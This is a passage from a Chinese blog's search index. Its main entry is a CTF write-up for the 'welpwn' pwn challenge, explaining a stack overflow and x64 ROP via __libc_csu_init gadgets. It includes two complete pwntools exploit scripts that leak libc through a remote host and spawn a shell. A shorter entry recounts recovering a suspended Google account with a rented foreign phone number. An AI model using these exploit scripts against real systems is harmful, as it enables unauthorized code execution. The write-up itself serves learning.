        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这一题做的时间跨度比较长了，断断续续做了一天多，然后尝试了两种方式，一种是DynELF泄露system地址，还有一种是利用python的LibcSearcher模块得到libc偏移再进一步获取system的libc地址。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><h3 id="0x00-检查保护机制"><a href="#0x00-检查保护机制" class="headerlink" title="0x00.检查保护机制"></a>0x00.检查保护机制</h3><p><img src="https://img-blog.csdnimg.cn/20200320190823909.jpg" alt=""><br><strong>感觉是栈溢出然后构造ROP来getshell。</strong></p><h3 id="0x01-找到溢出点"><a href="#0x01-找到溢出点" class="headerlink" title="0x01.找到溢出点"></a>0x01.找到溢出点</h3><p><img src="https://img-blog.csdnimg.cn/20200320191121171.jpg" alt=""><br><img src="https://img-blog.csdnimg.cn/20200320191156122.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>read函数是不能溢出的，进echo函数查看，发现echo函数开辟的大小只有0x20，<strong>但是buf可以写入的有0x400字节，buf复制到echo，显然可以发生溢出。</strong><br><strong>利用cyclic计算得出溢出需要24字节。</strong></p><h3 id="0x02-跳过echo在buf上构造rop"><a href="#0x02-跳过echo在buf上构造rop" class="headerlink" title="0x02.跳过echo在buf上构造rop"></a>0x02.跳过echo在buf上构造rop</h3><p>我们可以发现在echo函数内部，有一个循环判断，a1[i]!=’\x00’，否则会发生截断。但是构造rop需要传递地址，一般都会有’\x00’存在，故不能直接构造rop。<br><img src="https://img-blog.csdnimg.cn/20200320191852756.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br><img src="https://img-blog.csdnimg.cn/20200320191908900.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><pre><code>ida查看echo函数的结束地址之后就是read(&amp;buf)的地址。又因为echo开辟的空间是0x20，故echo开始处跳0x20个字节即能到buf处。buf上有0x400大小可以布置ROP。一次rop是8字节，找一个gadget执行四次pop即可。</code></pre><h3 id="0x03-选择合适的gadgets"><a href="#0x03-选择合适的gadgets" class="headerlink" title="0x03.选择合适的gadgets"></a>0x03.选择合适的gadgets</h3><p><img src="https://img-blog.csdnimg.cn/2020032019213157.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""></p><pre class="line-numbers language-yaml"><code class="language-yaml">pop4_addr=0x40089c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="0x04-万能的通用gadgets"><a href="#0x04-万能的通用gadgets" class="headerlink" title="0x04.万能的通用gadgets"></a>0x04.万能的通用gadgets</h3><blockquote><p>剩下的ROP链可以用通用gadgets来实现。<br>这里涉及到X64下面的一些万能gadgets，原因在于__libc_csu_init()函数。<br>一般来说，只要程序调用了libc.so，程序都会有这个函数用来对libc进行初始化操作。</p></blockquote><p><strong>汇编代码如下：</strong></p><pre><code>  400606:   48 8b 5c 24 08          mov    0x8(%rsp),%rbx  40060b:   48 8b 6c 24 10          mov    0x10(%rsp),%rbp  400610:   4c 8b 64 24 18          mov    0x18(%rsp),%r12  400615:   4c 8b 6c 24 20          mov    0x20(%rsp),%r13  40061a:   4c 8b 74 24 28          mov    0x28(%rsp),%r14  40061f:   4c 8b 7c 24 30          mov    0x30(%rsp),%r15</code></pre><pre><code>  4005f0:   4c 89 fa                mov    %r15,%rdx  4005f3:   4c 89 f6                mov    %r14,%rsi  4005f6:   44 89 ef                mov    %r13d,%edi  4005f9:   41 ff 14 dc             callq  *(%r12,%rbx,8)</code></pre><blockquote><p>我们可以看到利用0x400606处的代码我们可以控制rbx,rbp,r12,r13,r14和r15的值，随后利用0x4005f0处的代码我们将r15的值赋值给rdx, r14的值赋值给rsi,r13的值赋值给edi，随后就会调用call qword ptr [r12+rbx<em>8]。这时候我们只要再将rbx的值赋值为0，再通过精心构造栈上的数据，我们就可以控制pc去调用我们想要调用的函数了（比如说write函数）。执行完call qword ptr [r12+rbx</em>8]之后，程序会对rbx+=1，然后对比rbp和rbx的值，如果相等就会继续向下执行并ret到我们想要继续执行的地址。所以为了让rbp和rbx的值相等，我们可以将rbp的值设置为1，因为之前已经将rbx的值设置为0了。大概思路就是这样，我们下来构造ROP链。</p></blockquote><p><strong>call system(“/bin/sh”)</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!bash</span><span class="token comment" spellcheck="true">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span><span class="token comment" spellcheck="true">#system(rdi = bss_addr+8 = "/bin/sh")</span>payload3 <span class="token operator">=</span>  <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">136</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400606</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x4005F0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span>payload3 <span class="token operator">+=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">56</span>payload3 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>参考blog：</strong><a href="http://www.vuln.cn/6644" target="_blank" rel="noopener">蒸米-一步一步学ROP之x64</a><br><strong>实例运用：</strong><a href="https://blog.csdn.net/weixin_43092232/article/details/104906434" target="_blank" rel="noopener">64位程序rop链构造</a></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="使用DynELF"><a href="#使用DynELF" class="headerlink" title="使用DynELF"></a>使用DynELF</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -.- coding=UTF-8 -.-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48359</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>pop4_addr <span class="token operator">=</span> <span class="token number">0x40089c</span> <span class="token comment" spellcheck="true">#跳过echo</span>pop6_addr <span class="token operator">=</span> <span class="token number">0x40089a</span> <span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15;ret;</span>rop2_addr <span class="token operator">=</span> <span class="token number">0x400880</span> <span class="token comment" spellcheck="true">#mov rdx,r15;mov rdi,r14;mov edi,r13;</span>start_addr <span class="token operator">=</span> <span class="token number">0x400630</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008a3</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#先接收一次</span>    payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true">#junk</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过write函数泄露 pop r14,r15;</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#write(1,address,8)</span>    payload <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#start调整栈帧</span>    payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#回到main函数</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"%# x => %s "</span> <span class="token operator">%</span> <span class="token punctuation">(</span>address<span class="token punctuation">,</span><span class="token punctuation">(</span>data <span class="token operator">or</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> datadyn <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> dyn<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#写入/bin/sh</span>payload1 <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#read(0,bss_addr,8)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span> payload1 <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> 执行system<span class="token punctuation">(</span><span class="token string">'bss_addr'</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#把'/bin/sh'写到bss_addr</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用LibcSearcher"><a href="#使用LibcSearcher" class="headerlink" title="使用LibcSearcher"></a>使用LibcSearcher</h3><p><strong>使用write_addr-libc.dump(‘write’)计算出libc_off地址<br>再由libc_off+libc.dump(‘system’)计算出system_addr</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -.-coding=UTF-8 -.-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token number">48359</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./welpwn'</span><span class="token punctuation">)</span>pop4_addr <span class="token operator">=</span> <span class="token number">0x40089c</span>pop6_addr <span class="token operator">=</span> <span class="token number">0x40089a</span>rop2_addr <span class="token operator">=</span> <span class="token number">0x400880</span>start_addr <span class="token operator">=</span> <span class="token number">0x400630</span>write_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>puts_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#bss_addr = elf.bss()</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x4008a3</span> <span class="token comment" spellcheck="true">#pop rdi;ret</span>main_addr <span class="token operator">=</span> <span class="token number">0x4007CD</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算libc_off</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop6_addr<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pop rbx,rbp,r12,r13,r14,r15</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#通过write函数来泄露write_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop2_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#调用start函数调整栈帧</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info <span class="token punctuation">(</span><span class="token string">"write_addr => %#x"</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>libc_off<span class="token operator">=</span>write_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算libc的偏移</span>sys_addr <span class="token operator">=</span> libc_off <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算system地址</span>binsh_addr <span class="token operator">=</span> libc_off <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#计算'/bin/sh'地址</span>payload1 <span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop4_addr<span class="token punctuation">)</span><span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>payload1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span>payload1 <span class="token operator">=</span> payload1<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意：<br>使用LibcSearcher方式，python要安装了相对应模块，还需要下载对应的libc版本。<strong>我第二种方法只是给了一个模板，未使用此方法getshell。</strong><br><strong>参考博客：</strong><a href="https://blog.csdn.net/weixin_43092232/article/details/104996280" target="_blank" rel="noopener">Ubuntu下LibcSearcher的安装和使用方法</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google账号活动异常怎么办？|试了好多办法终于解决</title>
      <link href="/2020/03/21/google/"/>
      <url>/2020/03/21/google/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我在copySDN上的帖子竟然被删了…给的理由是翻墙，wok…<br>突然发现可以直接导出md再传到自己的blog上哈哈哈！<br>说到google账户，我想不少人用google的时候都是以访客身份登录的。<br>但是，一个google账户有些时候还是很有用的，比如在YouTube上面下载视频（某次比赛就用到了），或者你看某些需要确认你年龄的视频（手动狗头）！！总而言之，你会忍不住想要注册一个账号！！！<br>当然，现在注册账号国内手机号不一定可以了，反正我当初的时候还可以…但是由于登录地点经常不同（为啥？自己想），被检测到就会被封号！！<br><strong>敲黑板！！！</strong><br><strong>现在还没被封的赶紧去开两步验证！</strong></p><hr><p>下面开始我的悲惨故事：<br>终于有一天，google查到了我的头上，在我还不知道有封号这会事之前，给我把账号冻结了。冻结了就冻结了吧，反正我绑了邮箱（<strong>当初没有绑定手机号！！！切记赶紧去绑！！</strong>），我就登邮箱啊，结果一切都验证完之后，它会跳出来一个这个界面：<br><img src="https://img-blog.csdnimg.cn/20200224212525221.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>这个我再填自己手机号就报错了，无法验证，一开始我还以为是我手机号的问题，我试了好多其他的都不行（我还用香港的手机号试了都不行….）绝望.jpg！<br>而且这时候，我再去注册一个google号，发现也注册不了了！绝望.GIF！</p><hr><h1 id="我是怎么解决的？"><a href="#我是怎么解决的？" class="headerlink" title="我是怎么解决的？"></a>我是怎么解决的？</h1><p>下面是我逛遍某乎、某宝、某度、v2ex、google…的经历</p><h2 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h2><p><a href="https://www.zhihu.com/question/39866455" target="_blank" rel="noopener">某乎链接</a><br><strong>选择尝试其他问题</strong><br><img src="https://img-blog.csdnimg.cn/20200224213245757.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>2016年的老贴，反正我按他说的做没成功…</p><h2 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h2><p><img src="https://img-blog.csdnimg.cn/20200224213504469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>买手机号，反正我是没有尝试去买，但我试过香港的手机号，一样不能用于验证。</p><h2 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h2><p><a href="https://v2ex.com/t/292377" target="_blank" rel="noopener">v2ex上的贴子</a><br><img src="https://img-blog.csdnimg.cn/20200224214022949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>给google发邮件，知乎上也有人提到了这种方法。<br>附上他们给的邮箱地址：<a href="mailto:accounts-support@google.com">accounts-support@google.com</a><br>这种方法我试了最久，发了第五封邮件的时候终于回我了。<br><img src="https://img-blog.csdnimg.cn/2020022421424795.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>我第一眼还以为给了我个验证的链接！看到no-reply我心就凉了…<br>咋地？？几年过去这个账号被弃用了？？（我有理由怀疑是我被拉黑了…我前面几天发的就回了这一封，但是回了这一封之后我再发就是秒回了！！！）<br>邮箱也不行，我吐了！</p><h2 id="Part4"><a href="#Part4" class="headerlink" title="Part4"></a>Part4</h2><p>最后，我用了最直接的方法解决了这个问题。找了个在英国的熟人，用他手机号接收了验证码。结果如下：<br><img src="https://img-blog.csdnimg.cn/20200224214737603.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt=""><br>又考虑到这个方法不太具有普适性，所以我附了一个可以租用外国电话号码的网址，<a href="https://www.smspva.com/" target="_blank" rel="noopener">点击此处</a></p><p><strong>最后祝大家都能成功解决问题！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Google </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -疑难杂症 -Google账号 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
